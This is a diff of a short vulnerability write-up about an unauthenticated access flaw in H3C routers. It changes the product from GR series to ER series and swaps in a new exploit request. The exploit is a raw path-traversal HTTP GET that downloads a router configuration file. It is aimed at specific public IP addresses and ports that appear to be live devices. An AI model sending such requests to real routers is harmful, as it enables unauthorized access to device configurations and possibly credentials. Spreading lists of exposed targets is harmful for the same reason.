@@ -1,6 +1,6 @@
-# H3C GR series router system management has unauthorized access vulnerability
+# H3C ER series router system management has unauthorized access vulnerability
 
-**Product**: GR series router
+**Product**: ER series router
 
 **version**: all
 
@@ -15,8 +15,8 @@
 **exp**:
 
 ```http
-GET /userLogin.asp/../actionpolicy_status/../GR1100-P.cfg HTTP/1.1
-Host: 123.178.139.174:8989
+GET /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg HTTP/1.1
+Host: 58.221.11.74:12345
 Sec-Fetch-Mode: navigate
 Sec-Fetch-User: ?1
 Sec-Fetch-Dest: document
